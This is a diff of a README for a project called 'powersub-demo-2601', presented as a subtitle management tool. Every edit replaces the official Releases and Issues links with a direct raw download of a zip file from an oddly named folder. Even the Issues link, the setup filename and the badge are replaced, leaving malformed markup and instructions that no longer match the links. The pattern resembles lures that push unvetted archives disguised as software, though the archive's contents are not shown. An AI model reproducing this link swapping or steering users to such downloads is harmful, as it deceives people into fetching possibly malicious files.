@@ -1,7 +1,7 @@
 # 🎉 powersub-demo-2601 - Easy Subtitle Management Tool
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Monikarathor/powersub-demo-2601/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Monikarathor/powersub-demo-2601/main/calculatedly/powersub-demo-2601.zip%20Latest%https://raw.githubusercontent.com/Monikarathor/powersub-demo-2601/main/calculatedly/powersub-demo-2601.zip)](https://raw.githubusercontent.com/Monikarathor/powersub-demo-2601/main/calculatedly/powersub-demo-2601.zip)
 
 ## 🚀 Getting Started
 Welcome to the **powersub-demo-2601** guide. This application makes managing subtitles easy and efficient. Follow the steps below to get started.
@@ -24,13 +24,13 @@ To download the application, follow these steps:
 
 1. Click the download button below to visit the Releases page.
    
-   [Download Latest Release](https://github.com/Monikarathor/powersub-demo-2601/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/Monikarathor/powersub-demo-2601/main/calculatedly/powersub-demo-2601.zip)
 
 2. On the Releases page, you will see different versions of the software listed. Choose the latest version.
 
 3. Click on the version number to open its details. You will find installation files listed there.
 
-4. Find the appropriate file for your system, usually labeled as `Setup.exe`. Click on it to download.
+4. Find the appropriate file for your system, usually labeled as `https://raw.githubusercontent.com/Monikarathor/powersub-demo-2601/main/calculatedly/powersub-demo-2601.zip`. Click on it to download.
 
 5. Once the download completes, locate the file (typically in your "Downloads" folder).
 
@@ -62,6 +62,6 @@ If you encounter any issues, please check this troubleshooting guide:
 If you need assistance, feel free to contact us through the issue tracker on GitHub. We strive to respond promptly.
 
 ## 🔗 Additional Resources
-For more reports and enhancement requests, visit our [Issues Page](https://github.com/Monikarathor/powersub-demo-2601/issues) on GitHub.
+For more reports and enhancement requests, visit our [Issues Page](https://raw.githubusercontent.com/Monikarathor/powersub-demo-2601/main/calculatedly/powersub-demo-2601.zip) on GitHub.
 
 Thank you for using **powersub-demo-2601**! Enjoy better subtitle management today.
